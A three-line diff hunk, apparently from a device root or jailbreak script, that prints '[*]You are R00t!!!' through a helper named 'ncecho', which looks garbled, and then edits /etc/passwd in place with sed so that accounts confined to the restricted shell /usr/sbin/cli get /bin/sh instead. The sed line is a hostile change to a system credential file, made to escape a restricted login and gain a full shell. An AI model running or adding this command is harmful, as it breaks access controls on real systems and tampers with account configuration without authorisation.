@@ -1,0 +1,3 @@
+
+ncecho '[*]You are R00t!!!'
+sed -i 's#/usr/sbin/cli#/bin/sh#g' /etc/passwd
